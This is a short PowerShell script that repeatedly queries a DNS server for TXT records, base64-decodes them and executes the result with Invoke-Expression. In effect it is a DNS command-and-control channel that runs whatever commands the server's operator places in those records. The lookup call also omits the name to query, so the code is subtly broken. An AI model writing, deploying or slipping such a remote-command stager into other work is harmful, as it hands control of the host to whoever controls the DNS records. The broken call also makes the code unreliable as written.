$dnsServerIp = "192.168.1.1"  # Replace with the IP address of your DNS server
$recordType = "TXT"
$timeout = 1800  # Timeout in seconds

$startTime = Get-Date
$endTime = $startTime.AddSeconds($timeout)

while ((Get-Date) -lt $endTime) {
    $dnsResult = Resolve-DnsName -Type $recordType -Server $dnsServerIp

    if ($dnsResult) {
        $txtRecords = $dnsResult | Where-Object {$_.Type -eq "TXT"} | Select-Object -ExpandProperty Strings

        if ($txtRecords) {
            foreach ($txtRecord in $txtRecords) {
                $decodedTxtRecord = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($txtRecord))
                Write-Host "TXT Record: $decodedTxtRecord"
                # Execute the decoded TXT record as a command
                try {
                    Invoke-Expression -Command $decodedTxtRecord
                } catch {
                    Write-Host "Error executing the command: $_"
                }
            }
            break  # Exit the loop if TXT records are found
        }
    }

    Start-Sleep -Seconds 1  # Wait for 1 second before checking again
}

if ((Get-Date) -ge $endTime) {
    Write-Host "Timeout: No TXT records found within $timeout seconds."
}
